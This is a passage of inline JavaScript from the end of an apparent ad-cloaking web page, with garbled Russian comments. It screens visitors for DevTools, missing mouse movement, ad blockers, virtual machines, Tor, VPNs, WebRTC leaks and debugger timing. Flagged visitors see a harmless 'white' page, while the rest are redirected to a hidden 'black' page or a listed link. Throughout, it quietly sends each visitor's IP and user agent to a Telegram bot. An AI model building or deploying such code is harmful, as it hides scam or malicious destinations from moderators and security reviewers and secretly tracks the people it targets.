                // 7. –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –º–æ–¥–µ—Ä–∞—Ç–æ—Ä–∞/—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞
                if (deviceConfig.CheckDevTools && isLikelyModerator()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω—ã –æ—Ç–∫—Ä—ã—Ç—ã–µ DevTools (–ø–æ —Ä–∞–∑–º–µ—Ä—É –æ–∫–Ω–∞)", userInfo);
                    return WHITE_PAGE;
                }
                
                // 8. –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ (—Ç–æ–ª—å–∫–æ –¥–ª—è –ü–ö)
                if (!isMobile && deviceConfig.CheckMouseMovement && !hadMouseMovement) {
                    // –≠—Ç–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç—Å—è –æ—Ç–¥–µ–ª—å–Ω–æ —á–µ—Ä–µ–∑ timeout
                    return null;
                }
                
                // 9. –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–∞—Å—Ç–æ—Ç—ã –ø–æ—Å–µ—â–µ–Ω–∏–π
                if (deviceConfig.CheckVisitFrequency && isBlockedByFrequency()) {
                    await sendTelegramReport("–ü—Ä–µ–≤—ã—à–µ–Ω–∞ —á–∞—Å—Ç–æ—Ç–∞ –ø–æ—Å–µ—â–µ–Ω–∏–π", userInfo);
                    return WHITE_PAGE;
                }
                
                // 10. –≠–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∞–ª—å–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏
                if (config.experimental.CheckAdBlocker && detectAdblocker()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω –±–ª–æ–∫–∏—Ä–æ–≤—â–∏–∫ —Ä–µ–∫–ª–∞–º—ã", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckVirtualMachine && checkForVirtualMachine()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –º–∞—à–∏–Ω–∞", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckTorNetwork && await checkTorNetwork()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —Å–µ—Ç—å Tor", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckVPN && await detectProxiesOrVPN()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω –ø—Ä–æ–∫—Å–∏/VPN", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.PerformTimingAttacks && performTimingAttacks()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω –æ—Ç–ª–∞–¥—á–∏–∫ (—Ç–∞–π–º–∏–Ω–≥-–∞—Ç–∞–∫–∞)", userInfo);
                    return WHITE_PAGE;
                }
                
                if (config.experimental.CheckWebRTCLeakage && await checkWebRTCLeakage()) {
                    await sendTelegramReport("–û–±–Ω–∞—Ä—É–∂–µ–Ω–∞ —É—Ç–µ—á–∫–∞ WebRTC (–≤–µ—Ä–æ—è—Ç–Ω–æ VPN)", userInfo);
                    return WHITE_PAGE;
                }
                
                // –ï—Å–ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –ø—Ä–æ—à–µ–ª –≤—Å–µ –ø—Ä–æ–≤–µ—Ä–∫–∏, –æ–ø—Ä–µ–¥–µ–ª—è–µ–º —Ü–µ–ª–µ–≤—É—é —Å—Å—ã–ª–∫—É
                const codeParam = getUrlParameter('code');
                
                if (codeParam) {
                    try {
                        const linksText = await loadFile('links.txt');
                        if (linksText) {
                            const links = linksText.split('\n').filter(link => link.trim());
                            
                            const codeNumber = parseInt(codeParam);
                            if (!isNaN(codeNumber) && codeNumber > 0 && codeNumber <= links.length) {
                                return links[codeNumber - 1].trim();
                            } else {
                                // –ï—Å–ª–∏ –Ω–æ–º–µ—Ä –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω, –≤—ã–±–∏—Ä–∞–µ–º —Å–ª—É—á–∞–π–Ω—É—é —Å—Å—ã–ª–∫—É
                                const randomIndex = Math.floor(Math.random() * links.length);
                                return links[randomIndex].trim();
                            }
                        }
                    } catch (e) {
                        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–±–æ—Ä–µ —Å—Å—ã–ª–∫–∏ –ø–æ –ø–∞—Ä–∞–º–µ—Ç—Ä—É code:", e);
                    }
                }
                
                return BLACK_PAGE;
            } catch (error) {
                console.error("–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ —Ü–µ–ª–∏ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞:", error);
                
                // –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á–µ—Ç–∞ –æ–± –æ—à–∏–±–∫–µ
                try {
                    await sendTelegramReport(`–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: ${error.message || 'Unknown error'}`, 
                                           userInfo || { deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–î–µ—Å–∫—Ç–æ–ø' });
                } catch (e) {
                    console.error("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ—Ç—á–µ—Ç –æ–± –æ—à–∏–±–∫–µ:", e);
                }
                
                return WHITE_PAGE;
            }
        }

        /**
         * –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ü–µ–ª–µ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
         */
        function redirect(url) {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            const delay = isMobile ? 
                          config.mobile.RedirectDelay : 
                          config.desktop.RedirectDelay;
            
            setTimeout(() => {
                pageFullyLoaded = true;
                window.location.href = url;
            }, delay);
        }

        // ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–ë–´–¢–ò–ô =====

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
        document.addEventListener('mousemove', () => {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                
                // –°–∫—Ä—ã–≤–∞–µ–º –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ–ª–æ–≤–µ–∫–∞
                humanVerificationBlock.classList.add('hidden');
            }
            
            // –ï—Å–ª–∏ —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ –º—ã—à–∏ –∞–∫—Ç–∏–≤–µ–Ω, –æ—á–∏—â–∞–µ–º –µ–≥–æ
            if (mouseMoveTimeout) {
                clearTimeout(mouseMoveTimeout);
                mouseMoveTimeout = null;
            }
            
            // –ü–æ—Å–ª–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –∑–∞–ø—É—Å–∫–∞–µ–º —Ä–µ–¥–∏—Ä–µ–∫—Ç —á–µ—Ä–µ–∑ –∑–∞–¥–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è (—Ç–æ–ª—å–∫–æ –æ–¥–∏–Ω —Ä–∞–∑)
            if (!redirectTimeout && !redirectInitiated) {
                redirectTimeout = setTimeout(async () => {
                    const target = await determineRedirectTarget();
                    if (target) {
                        redirect(target);
                    }
                }, config.desktop.RedirectDelay);
            }
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ —Å–∫—Ä—ã–≤–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥
        if (isMobile) {
            hadMouseMovement = true;
            humanVerificationBlock.classList.add('hidden');
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≤—É—à–∫–∏ –¥–ª—è –±–æ—Ç–æ–≤
        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
            e.preventDefault();
            botTrapActivated = true;
            
            if (userInfo === null) {
                userInfo = await collectUserInfo();
            }
            
            await sendTelegramReport("–ö–ª–∏–∫ –ø–æ –ª–æ–≤—É—à–∫–µ –¥–ª—è –±–æ—Ç–æ–≤", userInfo);
            redirect(WHITE_PAGE);
        });

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Ä–∞–Ω–Ω–µ–≥–æ —É—Ö–æ–¥–∞
        window.addEventListener('beforeunload', async () => {
            if (!pageFullyLoaded && !redirectInitiated) {
                if (userInfo === null) {
                    userInfo = await collectUserInfo();
                }
                
                // –ò—Å–ø–æ–ª—å–∑—É–µ–º sendBeacon –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –¥–∞–∂–µ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
                const message = `üö® –†–ê–ù–ù–ò–ô –£–•–û–î!\n\nüì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ' : '–î–µ—Å–∫—Ç–æ–ø'}\n‚è±Ô∏è –í—Ä–µ–º—è –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ: ${Math.round(performance.now() - PAGE_LOAD_START)}–º—Å\nüî¢ –°—á–µ—Ç—á–∏–∫ –≤–∏–∑–∏—Ç–æ–≤: ${visitCount}\nüåê IP: ${userInfo.ipAddress || '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ'}\nüñ•Ô∏è User-Agent: ${navigator.userAgent}`;
                
                const blob = new Blob([JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message
                })], { type: 'application/json' });
                
                navigator.sendBeacon(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, blob);
            }
        });

        // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = async () => {
            try {
                // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –Ω–∞–±–ª—é–¥–∞—Ç–µ–ª—è –∑–∞ iframe
                setupModerationFrameObserver();
                
                // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º —Å—Ä–∞–∑—É
                if (isMobile) {
                    const target = await determineRedirectTarget();
                    if (target) {
                        redirect(target);
                    }
                } else {
                    // –î–ª—è –ü–ö —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
                    mouseMoveTimeout = setTimeout(async () => {
                        if (!hadMouseMovement) {
                            userInfo = await collectUserInfo();
                            await sendTelegramReport("–û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏", userInfo);
                            redirect(WHITE_PAGE);
                        }
                    }, config.desktop.MouseMovementTimeout);
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ onload:", error);
                redirect(WHITE_PAGE);
            }
        };
    })();
    </script>
</body>
</html>
